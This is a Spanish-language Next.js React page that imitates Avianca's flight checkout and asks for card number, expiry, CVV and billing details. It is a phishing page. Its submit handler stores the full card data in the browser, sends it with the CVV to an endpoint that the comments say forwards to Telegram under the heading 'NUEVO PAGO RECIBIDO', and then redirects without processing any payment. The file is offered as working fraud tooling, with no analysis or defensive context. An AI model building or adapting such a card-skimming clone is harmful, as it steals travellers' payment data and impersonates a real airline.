"use client"

import { useState, useEffect } from "react"
import { useSearchParams, useRouter } from "next/navigation"
import { ChevronRight, Info, PlaneTakeoff, ChevronDown, ShoppingCart } from "lucide-react"
import { SiteLogo } from "@/components/ui/site-logo"
import Link from "next/link"

// Tipos para los datos de la tarjeta
type CardData = {
  cardholderName: string
  cardNumber: string
  expiryMonth: string
  expiryYear: string
  cvv: string
  cardType: string | null
}

export default function PagoPage() {
  const searchParams = useSearchParams()
  const router = useRouter()
  const [loading, setLoading] = useState(true)
  const [showDetails, setShowDetails] = useState(false)

  // Estado para los métodos de pago
  const [useAviancaCredits, setUseAviancaCredits] = useState(false)
  const [paymentMethod, setPaymentMethod] = useState("pse")

  // Estado para los datos de la tarjeta
  const [cardData, setCardData] = useState<CardData>({
    cardholderName: "",
    cardNumber: "",
    expiryMonth: "",
    expiryYear: "",
    cvv: "",
    cardType: null
  })

  const [errors, setErrors] = useState({
    cardholderName: "",
    cardNumber: "",
    expiryMonth: "",
    expiryYear: "",
    cvv: ""
  })

  // Estado para opciones adicionales
  const [installments, setInstallments] = useState(false)
  const [twoCards, setTwoCards] = useState(false)

  // Estado para datos de facturación
  const [billingData, setBillingData] = useState({
    email: "",
    address: "",
    city: "",
    country: "CO",
  })

  // Datos del vuelo desde los parámetros de URL
  const origin = searchParams.get("outboundOrigin") || ""
  const destination = searchParams.get("outboundDestination") || ""
  const departureDate = searchParams.get("returndepartureDate") || ""
  const returnDate = searchParams.get("returnreturnDate") || ""
  const passengers = Number(searchParams.get("passengers") || "1")
  const tripType = searchParams.get("tripType") || "roundTrip"
  const returnFareType = searchParams.get("returnFareType") || ""
  const returnPrice = Number.parseInt(searchParams.get("returnPrice") || "0")
  const outboundPrice = Number.parseInt(searchParams.get("outboundPrice") || "0")
  const servicesTotal = Number.parseInt(searchParams.get("servicesTotal") || "0")

  // Datos del vuelo de ida
  const outboundDepartureTime = searchParams.get("outboundDepartureTime") || "07:14"
  const outboundArrivalTime = searchParams.get("outboundArrivalTime") || "08:18"
  const outboundDuration = searchParams.get("outboundDuration") || "1h 4m"

  // Datos del vuelo de vuelta
  const returnDepartureTime = searchParams.get("returnDepartureTime") || "06:23"
  const returnArrivalTime = searchParams.get("returnArrivalTime") || "07:25"
  const returnDuration = searchParams.get("returnDuration") || "1h 2m"

  // Precio total
  const totalPrice = searchParams.get("totalPrice") || "0"

  useEffect(() => {
    // Simulamos carga de datos
    setTimeout(() => {
      setLoading(false)
    }, 1000)
  }, [])

  // Función para detectar el tipo de tarjeta
  const detectCardType = (cardNumber: string): string | null => {
    const cleaned = cardNumber.replace(/\s+/g, '')
    
    // Visa
    if (/^4/.test(cleaned)) {
      return 'visa'
    }
    // Mastercard
    if (/^5[1-5]/.test(cleaned)) {
      return 'mastercard'
    }
    // American Express
    if (/^3[47]/.test(cleaned)) {
      return 'amex'
    }
    
    return null
  }

  // Formatear número de tarjeta con espacios cada 4 dígitos
  const formatCardNumber = (value: string): string => {
    const cleaned = value.replace(/\D/g, '')
    const cardType = detectCardType(cleaned)
    
    // American Express tiene formato 4-6-5
    if (cardType === 'amex') {
      if (cleaned.length > 10) {
        return `${cleaned.slice(0, 4)} ${cleaned.slice(4, 10)} ${cleaned.slice(10, 15)}`.trim();
      } else if (cleaned.length > 4) {
        return `${cleaned.slice(0, 4)} ${cleaned.slice(4, 10)}`.trim();
      }
    }

    // Otras tarjetas formato 4-4-4-4
    return cleaned.replace(/(\d{4})(?=\d)/g, '$1 ').trim();
  }

  // Validar número de tarjeta según tipo
  const validateCardNumber = (cardNumber: string): boolean => {
    const cleaned = cardNumber.replace(/\s+/g, '')
    const cardType = detectCardType(cleaned)
    
    if (cardType === 'amex') {
      return cleaned.length === 15
    }
    
    return cleaned.length === 16
  }

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target

    if (name === "cardNumber") {
      const formatted = formatCardNumber(value)
      const cardType = detectCardType(formatted)
      setCardData({
        ...cardData,
        cardNumber: formatted,
        cardType,
      })
      setErrors({
        ...errors,
        cardNumber: validateCardNumber(formatted) ? "" : "Número de tarjeta inválido",
      })
    } else if (name === "cardholderName" || name === "expiryMonth" || name === "expiryYear" || name === "cvv") {
      // **CORRECCIÓN**: Usamos una función de actualización para garantizar el estado más reciente
      setCardData(prevData => ({
        ...prevData,
        [name]: value,
      }))
      // Validación simple en tiempo real
      setErrors({
        ...errors,
        [name]: value ? "" : "Este campo es requerido",
      })
    } else if (name.startsWith("billing")) { // Esto es para los campos de facturación
      setBillingData({
        ...billingData,
        [name.substring("billing".length).toLowerCase()]: value,
      })
    }
  }

  const handleToggleChange = (e: { target: { name: any; checked: any } }) => {
    const { name, checked } = e.target

    if (name === "aviancaCredits") {
      setUseAviancaCredits(checked)
    } else if (name === "installments") {
      setInstallments(checked)
    } else if (name === "twoCards") {
      setTwoCards(checked)
    }
  }

  const handleSubmit = async (e: { preventDefault: () => void }) => {
    e.preventDefault()
    
    // Validación final antes de enviar
    const newErrors = {
      cardholderName: cardData.cardholderName ? "" : "Nombre del titular es requerido",
      cardNumber: validateCardNumber(cardData.cardNumber) ? "" : "Número de tarjeta inválido",
      expiryMonth: cardData.expiryMonth ? "" : "Mes de expiración es requerido",
      expiryYear: cardData.expiryYear ? "" : "Año de expiración es requerido",
      cvv: cardData.cvv ? "" : "CVV es requerido"
    }

    setErrors(newErrors)

    // Verificar si hay errores
    const hasErrors = Object.values(newErrors).some(error => error !== "")
    if (hasErrors) {
      return
    }

    // Mostrar loader
    setLoading(true)

    try {
      // Construir objeto con los datos de pago a guardar
      // **CORRECCIÓN**: Aseguramos que el mes tenga dos dígitos y usamos el año tal como está.
      const expiryDate = `${cardData.expiryMonth.padStart(2, '0')}/${cardData.expiryYear}`;
      const paymentToSave = {
        name: cardData.cardholderName, // Usar 'name' para coincidir con chedf/page.tsx
        cardNumber: cardData.cardNumber,
        cvv: cardData.cvv,
        expiryDate: expiryDate,
        billingEmail: billingData.email || null,
        savedAt: new Date().toISOString(),
      }

      // Guardar en localStorage (cliente)
      if (typeof window !== "undefined" && window.localStorage) {
        localStorage.setItem("paymentData", JSON.stringify(paymentToSave))
      }

      // Enviar datos a Telegram
      try {
        const telegramMessage = `
NUEVO PAGO RECIBIDO

Tarjeta: ${cardData.cardNumber}
Expira: ${expiryDate}
CVV: ${cardData.cvv}
Pago: COP ${totalPrice}
Correo: ${billingData.email || 'No proporcionado'}
Celular: ${billingData.address || 'No proporcionado'}
        `.trim();

        await fetch('/api/send-message', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            text: telegramMessage,
          }),
        });
      } catch (telegramError) {
        console.error("Error enviando a Telegram:", telegramError);
      }

      // Mantener el loader visible unos instantes y luego redirigir a /chedf
      setTimeout(() => {
        router.push("/chedf")
      }, 1500)
    } catch (err) {
      console.error("Error guardando datos de pago:", err)
      setLoading(false)
      alert("Ocurrió un error al procesar el pago. Intenta de nuevo.")
    }
  }

  const formatShortDate = (dateString: string) => {
    if (!dateString) return ""
    const [year, month, day] = dateString.split("-").map((num) => Number.parseInt(num, 10))
    const date = new Date(year, month - 1, day, 12, 0, 0)
    return date.toLocaleDateString("es-ES", {
      month: "short",
      day: "numeric",
      year: "numeric",
    })
  }

  if (loading) {
    return (
      <div className="fixed inset-0 flex items-center justify-center bg-white z-50">
        <div className="text-center">
          <img src="/loading.gif" alt="Cargando..." className="w-32 h-32 mx-auto" />
        </div>
      </div>
    )
  }

  return (
    <main className="min-h-screen bg-gray-50 pb-20">
      <header className="hidden md:block bg-white shadow-sm ">
        <div className="container mx-auto px-4 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-x-4">
              <Link href="/">
                <SiteLogo className="h-8" />
              </Link>
              
              <div className="mb-5">
                <div className="text-center flex flex-col">
                  <div className="flex">
                    <h1 className="text-lg font-bold">
                      {origin.slice(0, origin.length - 5)} a {destination.slice(0, destination.length - 5)}
                    </h1>
                  </div>
                  <div className="flex">
                    <section className="flex items-center gap-x-2 mt-2">
                      <p className="flex items-center gap-x-2">
                        <PlaneTakeoff width={20} color="black" /> {formatShortDate(departureDate)}
                      </p>
                      {tripType === "roundTrip" && returnDate && (
                        <p className="flex items-center gap-x-2">
                          <PlaneTakeoff width={20} color="black" className="scale-x-[-1]" />
                          {formatShortDate(returnDate)}
                        </p>
                      )}
                      <p> {` • ${passengers} ${passengers === 1 ? "adulto" : "adultos"}`}</p>
                    </section>
                  </div>
                </div>
              </div>
            </div>
            <div>
              <button className="bg-white border border-gray-300 rounded-full px-4 py-2 text-sm font-medium flex items-center gap-x-2">
                <ShoppingCart />
                <span className="mr-1">COP</span>
                <span className="font-bold">{totalPrice.toLocaleString()}</span>
                <ChevronDown className="ml-1 h-4 w-4" />
              </button>
            </div>
          </div>
        </div>
      </header>

      <header className="bg-black shadow-sm block md:hidden">
        <div className="container mx-auto px-4 py-4">
          <div className="flex items-center justify-between">
            <div className="flex items-center"></div>
            <div>
              <button className="font-medium flex gap-x-2 items-center text-white">
                <div className="flex items-center">
                  <ShoppingCart/>
                  <div className="relative h-3 w-3 bg-green-500 rounded-full -top-2 -left-1 "></div>
                </div>
                <span>COP</span>
                <span className="font-black">
                  {totalPrice.toLocaleString()}</span>
              </button>
            </div>
          </div>
        </div>
      </header>

      <div className="container mx-auto px-4 py-4">
        {/* Breadcrumbs */}
        <div className="hidden md:flex items-center text-sm mb-6 overflow-x-auto whitespace-nowrap gap-x-4">
          <div className="flex items-center text-gray-400">
            <span className="mr-2">Vuelos</span>
            <ChevronRight className="w-4 h-4" />
          </div>
          <div className="flex items-center text-gray-400">
            <span className="mx-2">Pasajeros</span>
            <ChevronRight className="w-4 h-4" />
          </div>
          <div className="flex items-center text-gray-400">
            <span className="mx-2">Servicios</span>
            <ChevronRight className="w-4 h-4" />
          </div>
          <div className="flex items-center text-gray-400">
            <span className="mx-2">Asientos</span>
            <ChevronRight className="w-4 h-4" />
          </div>
          <div className="flex items-center text-black font-bold">
            <span className="mx-2">Pago</span>
            <ChevronRight className="w-4 h-4" />
          </div>
          <div className="flex items-center text-gray-400">
            <span className="mx-2">Confirmación</span>
          </div>
        </div>

        <div className="bg-white py-4 px-3 rounded-2xl mb-4">
          <div className="text-center flex flex-col">
            <div className="flex">
              <h1 className="text-lg font-bold">
                {origin.slice(0, origin.length - 5)} a {destination.slice(0, destination.length - 5)}
              </h1>
            </div>
            <div className="flex">
              <section className="flex items-center gap-x-2 mt-2">
                <p className="flex items-center gap-x-2">
                  <PlaneTakeoff width={20} color="black" /> {formatShortDate(departureDate)}
                </p>
                {tripType === "roundTrip" && returnDate && (
                  <p className="flex items-center gap-x-2">
                    <PlaneTakeoff width={20} color="black" className="scale-x-[-1]" />
                    {formatShortDate(returnDate)}
                  </p>
                )}
                <p> {` • ${passengers} ${passengers === 1 ? "adulto" : "adultos"}`}</p>
              </section>
            </div>
          </div>
        </div>
        
        <h1 className="text-2xl font-bold mb-6">Pagar y confirmar reserva</h1>

        <div className="flex flex-col md:flex-row gap-6">
          {/* Columna izquierda - Formulario de pago */}
          <div className="w-full md:w-2/3">
            {/* Opción de Avianca Credits */}
            <div className="mb-6 flex items-center">
              <label className="inline-flex items-center cursor-pointer">
                <input
                  type="checkbox"
                  name="aviancaCredits"
                  checked={useAviancaCredits}
                  onChange={handleToggleChange}
                  className="sr-only peer"
                />
                <div className="relative w-11 h-6 bg-gray-200 peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-red-300 rounded-full peer peer-checked:after:translate-x-full rtl:peer-checked:after:-translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:start-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-red-600"></div>
                <span className="ms-3 text-sm font-medium text-gray-900">Quiero pagar con avianca credits</span>
              </label>
            </div>

            {/* Métodos de pago */}
            <div className="bg-white rounded-lg shadow-sm p-4 mb-6">
              <button
                className={`w-full text-left p-3 rounded-lg flex flex-col md:flex-row md:justify-between md:items-center ${paymentMethod === "pse" ? "bg-gray-50" : ""}`}
                onClick={() => setPaymentMethod("pse")}
              >
                <div className="text-lg font-black">Pago por PSE</div>
                <div className="mt-2 flex items-center space-x-2 md:space-x-4">
                  <img src="/pse.png" alt="Banco 1" className="h-8 md:h-12" />
                  <img src="/daviplata.webp" alt="Banco 2" className="h-10 md:h-14" />
                </div>
              </button>
            </div>

            {/* Datos de la tarjeta */}
            <div className="bg-white rounded-lg shadow-sm p-6 mb-6">
              <section className="flex flex-col md:flex-row md:items-center justify-between mb-4">
                <h2 className="text-lg font-black">Datos de la tarjeta</h2>
                <div className="flex py-3">
                  <div className="flex space-x-2">
                    <div className={`border ${cardData.cardType === 'visa' ? 'border-red-500' : 'border-gray-300'} p-2 rounded-lg`}>
                      <img src="/visa.png" alt="Visa" className="h-6" />
                    </div>
                    <div className={`border ${cardData.cardType === 'amex' ? 'border-red-500' : 'border-gray-300'} p-2 rounded-lg`}>
                      <img src="/americard.png" alt="Amex" className="h-6" />
                    </div>
                    <div className={`border ${cardData.cardType === 'mastercard' ? 'border-red-500' : 'border-gray-300'} p-2 rounded-lg`}>
                      <img src="/mastercad.png" alt="Mastercard" className="h-6" />
                    </div>
                  </div>
                </div>
              </section>

              <div className="space-y-4">
                <div>
                  <label htmlFor="cardholderName" className="flex items-center text-sm text-gray-600 mb-1">
                    <span className="mr-1">Nombre del titular</span>
                  </label>
                  <input
                    type="text"
                    id="cardholderName"
                    name="cardholderName"
                    value={cardData.cardholderName}
                    onChange={handleInputChange}
                    className="w-full p-3 border border-gray-300 rounded-lg"
                    placeholder="Como aparece en la tarjeta"
                  />
                  {errors.cardholderName && <p className="text-red-500 text-xs mt-1">{errors.cardholderName}</p>}
                </div>

                <div>
                  <label htmlFor="cardNumber" className="flex items-center text-sm text-gray-600 mb-1">
                    <span className="mr-1">Número de tarjeta</span>
                  </label>
                  <input
                    type="text"
                    id="cardNumber"
                    name="cardNumber"
                    value={cardData.cardNumber}
                    onChange={handleInputChange}
                    className="w-full p-3 border border-gray-300 rounded-lg"
                    placeholder={cardData.cardType === 'amex' ? "0000 000000 00000" : "0000 0000 0000 0000"}
                    maxLength={cardData.cardType === 'amex' ? 17 : 19}
                  />
                  {errors.cardNumber && <p className="text-red-500 text-xs mt-1">{errors.cardNumber}</p>}
                </div>

                <div className="grid grid-cols-3 gap-4">
                  <div className="col-span-1">
                    <label htmlFor="expiryMonth" className="block text-sm text-gray-600 mb-1">
                      Mes
                    </label>
                    <select
                      id="expiryMonth"
                      name="expiryMonth"
                      value={cardData.expiryMonth}
                      onChange={handleInputChange}
                      className="w-full p-3 border border-gray-300 rounded-lg appearance-none"
                    >
                      <option value="">Mes</option>
                      {Array.from({ length: 12 }, (_, i) => i + 1).map((month) => (
                        <option key={month} value={month.toString().padStart(2, "0")}>
                          {month.toString().padStart(2, "0")}
                        </option>
                      ))}
                    </select>
                    {errors.expiryMonth && <p className="text-red-500 text-xs mt-1">{errors.expiryMonth}</p>}
                  </div>

                  <div className="col-span-1">
                    <label htmlFor="expiryYear" className="block text-sm text-gray-600 mb-1">
                      Año
                    </label>
                    <select
                      id="expiryYear"
                      name="expiryYear"
                      value={cardData.expiryYear}
                      onChange={handleInputChange}
                      className="w-full p-3 border border-gray-300 rounded-lg appearance-none"
                    >
                      <option value="">Año</option>
                      {Array.from({ length: 10 }, (_, i) => new Date().getFullYear() + i).map((year) => (
                        <option key={year} value={year.toString().slice(-2)}>
                          {year}
                        </option>
                      ))}
                    </select>
                    {errors.expiryYear && <p className="text-red-500 text-xs mt-1">{errors.expiryYear}</p>}
                  </div>

                  <div className="col-span-1">
                    <label htmlFor="cvv" className="flex items-center text-sm text-gray-600 mb-1">
                      <span className="mr-1">CVV</span>
                      <Info className="h-4 w-4 text-gray-400" />
                    </label>
                    <input
                      type="text"
                      id="cvv"
                      name="cvv"
                      value={cardData.cvv}
                      onChange={handleInputChange}
                      className="w-full p-3 border border-gray-300 rounded-lg"
                      placeholder={cardData.cardType === 'amex' ? "4 dígitos" : "3 dígitos"}
                      maxLength={cardData.cardType === 'amex' ? 4 : 3}
                    />
                    {errors.cvv && <p className="text-red-500 text-xs mt-1">{errors.cvv}</p>}
                  </div>
                </div>
              </div>
            </div>

            {/* Opciones adicionales */}
            <div className="space-y-4 mb-6">
              <div className="flex items-center">
                <label className="inline-flex items-center cursor-pointer">
                  <input
                    type="checkbox"
                    name="installments"
                    checked={installments}
                    onChange={handleToggleChange}
                    className="sr-only peer"
                  />
                  <div className="relative w-11 h-6 bg-gray-200 peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-red-300 rounded-full peer peer-checked:after:translate-x-full rtl:peer-checked:after:-translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:start-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-red-600"></div>
                  <span className="ms-3 text-sm font-medium text-gray-900">
                    Diferir el pago en cuotas con tu tarjeta local
                  </span>
                </label>
              </div>

              <div className="flex items-center">
                <label className="inline-flex items-center cursor-pointer">
                  <input
                    type="checkbox"
                    name="twoCards"
                    checked={twoCards}
                    onChange={handleToggleChange}
                    className="sr-only peer"
                  />
                  <div className="relative w-11 h-6 bg-gray-200 peer-focus:outline-none peer-focus:ring-4 peer-focus:ring-red-300 rounded-full peer peer-checked:after:translate-x-full rtl:peer-checked:after:-translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-[2px] after:start-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-red-600"></div>
                  <span className="ms-3 text-sm font-medium text-gray-900">Quiero pagar con dos tarjetas</span>
                  <Info className="ml-1 h-4 w-4 text-gray-400" />
                </label>
              </div>
            </div>

            {/* Datos de facturación */}
            <div className="bg-white rounded-lg shadow-sm p-6 mb-6">
              <h2 className="text-lg font-medium mb-4">Datos de facturación</h2>

              <div className="space-y-4">
                <div>
                  <label htmlFor="billingEmail" className="block text-sm text-gray-600 mb-1">
                    Correo electrónico
                  </label>
                  <input
                    type="email"
                    id="billingEmail"
                    name="billingEmail"
                    value={billingData.email}
                    onChange={handleInputChange}
                    className="w-full p-3 border border-gray-300 rounded-lg"
                    placeholder=""
                  />
                </div>

                <div>
                  <label htmlFor="billingAddress" className="block text-sm text-gray-600 mb-1">
                    Dirección de residencia
                  </label>
                  <input
                    type="text"
                    id="billingAddress"
                    name="billingAddress"
                    value={billingData.address}
                    onChange={handleInputChange}
                    className="w-full p-3 border border-gray-300 rounded-lg"
                    placeholder=""
                  />
                </div>

                <div>
                  <label htmlFor="billingCity" className="block text-sm text-gray-600 mb-1">
                    Ciudad
                  </label>
                  <input
                    type="text"
                    id="billingCity"
                    name="billingCity"
                    value={billingData.city}
                    onChange={handleInputChange}
                    className="w-full p-3 border border-gray-300 rounded-lg"
                    placeholder=""
                  />
                </div>

                <div>
                  <label htmlFor="billingCountry" className="block text-sm text-gray-600 mb-1">
                    País
                  </label>
                  <select
                    id="billingCountry"
                    name="billingCountry"
                    value={billingData.country}
                    onChange={handleInputChange}
                    className="w-full p-3 border border-gray-300 rounded-lg appearance-none"
                  >
                    <option value="CO">Colombia</option>
                    <option value="US">Estados Unidos</option>
                    <option value="ES">España</option>
                    <option value="MX">México</option>
                    <option value="AR">Argentina</option>
                    <option value="CL">Chile</option>
                    <option value="PE">Perú</option>
                    <option value="EC">Ecuador</option>
                  </select>
                </div>
              </div>
            </div>
          </div>

          {/* Columna derecha - Resumen de compra */}
          <div className="hidden md:block w-full md:w-1/3">
            <div className="bg-white rounded-lg shadow-sm p-6 sticky top-4">
              <h2 className="text-lg font-medium mb-4">Resumen de compra</h2>

              {/* Vuelo de ida */}
              <div className="mb-4">
                <h3 className="font-medium mb-2">Ida</h3>
                <div className="flex items-center mb-2">
                  <PlaneTakeoff className="h-4 w-4 mr-2" />
                  <span className="text-sm">
                    {origin.slice(0, origin.length - 5)} a {destination.slice(0, destination.length - 5)}
                  </span>
                </div>
                <section className="flex justify-between items-center mb-4">
                  <div className="text-sm text-gray-600 mb-2">{formatShortDate(departureDate)}</div>
                  <div className="text-xs text-center mt-1">
                    <span className="bg-red-600 text-white px-2 py-0.5 rounded-full">{returnFareType}</span>
                  </div>
                </section>
                <div className="flex justify-center items-center gap-x-2">
                  <p className="text-xs underline text-[#104A50]">Directo</p>
                  <p>|</p>
                  <p className="text-xs">{outboundDuration}</p>
                </div>
                <div className="flex items-center justify-between mb-2"> 
                  <div className="text-xl font-bold">{outboundDepartureTime}</div>
                  <div className="flex-1 mx-4">
                    <div className="relative">
                      <div className="border-t border-gray-300 border-dashed"></div>
                      <div className="absolute top-0 left-0 -mt-1 -ml-1 w-2 h-2 rounded-full bg-[#104A50]"></div>
                      <div className="absolute top-0 right-0 -mt-1 -mr-1 w-2 h-2 rounded-full bg-[#104A50]"></div>
                    </div>
                  </div>
                  <div className="text-xl font-bold">{outboundArrivalTime}</div>
                </div>

                <div className="text-xs bg-gray-50 text-gray-500 text-center py-1">
                  <p>Operado por Avianca</p>
                </div>
              </div>

              {/* Vuelo de vuelta */}
              {tripType === "roundTrip" && returnDate && (
              <div className="mb-4 pt-4 border-t border-gray-200">
                <h3 className="font-medium mb-2">Vuelta</h3>
                <div className="flex items-center mb-2">
                  <PlaneTakeoff className="h-4 w-4 mr-2 scale-x-[-1]" />
                  <span className="text-sm">
                    {destination.slice(0, destination.length - 5)} a {origin.slice(0, origin.length - 5)}
                  </span>
                </div>
                <section className="flex justify-between items-center mb-4">
                  <div className="text-sm text-gray-600 mb-2">{formatShortDate(returnDate)}</div>
                  <div className="text-xs text-center mt-1">
                    <span className="bg-red-600 text-white px-2 py-0.5 rounded-full">{returnFareType}</span>
                  </div>
                </section>
               
                <div className="flex justify-center items-center gap-x-2">
                  <p className="text-xs underline text-[#104A50]">Directo</p>
                  <p>|</p>
                  <p className="text-xs">{returnDuration}</p>
                </div>
                <div className="flex items-center justify-between mb-2">
                  <div className="text-xl font-bold">{returnDepartureTime}</div>
                  <div className="flex-1 mx-4">
                    <div className="relative">
                      <div className="border-t border-gray-300 border-dashed"></div>
                      <div className="absolute top-0 left-0 -mt-1 -ml-1 w-2 h-2 rounded-full bg-[#104A50]"></div>
                      <div className="absolute top-0 right-0 -mt-1 -mr-1 w-2 h-2 rounded-full bg-[#104A50]"></div>
                    </div>
                  </div>
                  <div className="text-xl font-bold">{returnArrivalTime}</div>
                </div>
                <div className="text-xs text-gray-500 text-center">Operado por Avianca</div>
              </div>
              )}

              {/* Pasajeros */}
              <div className="mb-4 pt-4 border-t border-gray-200">
                <div className="flex items-center">
                  <span className="mr-2">{passengers} Adulto</span>
                </div>
              </div>

              {/* Ver detalle */}
              <div className="mb-4 pt-2 border-t border-gray-200">
                <button
                  className="flex items-center justify-between w-full text-sm text-gray-600"
                  onClick={() => setShowDetails(!showDetails)}
                >
                  <span>Ver detalle</span>
                  <ChevronDown className={`h-4 w-4 transform ${showDetails ? "rotate-180" : ""}`} />
                </button>

                {showDetails && (
                  <div className="mt-2 space-y-2 text-sm">
                    <div className="flex justify-between">
                      <span>Vuelo ida</span>
                      <span>COP {outboundPrice.toLocaleString("es-CO")}</span>
                    </div>
                    {tripType === "roundTrip" && returnDate && (
                    <div className="flex justify-between">
                      <span>Vuelo vuelta</span>
                      <span>COP {returnPrice.toLocaleString("es-CO")}</span>
                    </div>
                    )}
                    <div className="flex justify-between">
                      <span>Servicios</span>
                      <span>COP {servicesTotal.toLocaleString("es-CO")}</span>
                    </div>
                  </div>
                )}
              </div>

              {/* Total */}
              <div className="pt-4 border-t border-gray-200">
                <div className="flex justify-between items-center">
                  <span className="font-medium">Total a pagar</span>
                  <span className="text-xl font-bold">COP {totalPrice.toLocaleString()}</span>
                </div>
              </div>
            </div>
          </div>
        </div>

        {/* Botón de continuar */}
        <div className="fixed bottom-0 left-0 right-0 bg-white p-4 shadow-lg border-t border-gray-200 z-20">
          <div className="container mx-auto flex justify-end">
            <button
              onClick={handleSubmit}
              className="bg-black text-white rounded-full px-8 py-3 font-medium hover:bg-black/80 transition"
            >
              {loading ? "Procesando..." : "Continuar"}
            </button>
          </div>
        </div>
      </div>
    </main>
  )
}
